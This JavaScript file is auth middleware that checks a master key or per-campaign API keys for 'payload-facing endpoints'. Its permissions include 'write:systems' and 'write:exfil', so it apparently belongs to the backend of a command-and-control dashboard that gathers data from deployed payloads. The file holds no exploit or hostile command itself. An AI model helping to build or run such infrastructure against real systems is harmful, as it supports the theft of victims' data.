// vercel-dashboard/api/auth/middleware.js
// Shared auth middleware for payload-facing endpoints

import { kv } from '../../lib/kv.js';

export async function verifyPayloadApiKey(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  const apiKey = authHeader || request.headers['x-api-key'];
  
  if (!apiKey) {
    return { valid: false, error: 'API key required', status: 401 };
  }

  // Check master key
  if (apiKey === process.env.MASTER_API_KEY) {
    return { valid: true, role: 'admin', permissions: ['*'], campaignId: null };
  }

  // Check campaign key
  const campaignIds = await kv.smembers('global:campaigns') || [];
  for (const cid of campaignIds) {
    const campaign = await kv.get(`campaign:${cid}`);
    if (campaign && campaign.apiKey === apiKey) {
      return { 
        valid: true, 
        role: 'campaign', 
        campaignId: cid,
        campaignName: campaign.name,
        permissions: ['write:systems', 'write:exfil', 'read:own']
      };
    }
  }

  return { valid: false, error: 'Invalid API key', status: 401 };
}

export function requireAuth(handler) {
  return async (request, response) => {
    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid) {
      return response.status(auth.status || 401).json({ error: auth.error });
    }
    request.auth = auth;
    return handler(request, response);
  };
}

export function requirePermission(permission) {
  return (handler) => async (request, response) => {
    if (!request.auth?.permissions?.includes(permission) && !request.auth?.permissions?.includes('*')) {
      return response.status(403).json({ error: `Permission required: ${permission}` });
    }
    return handler(request, response);
  };
}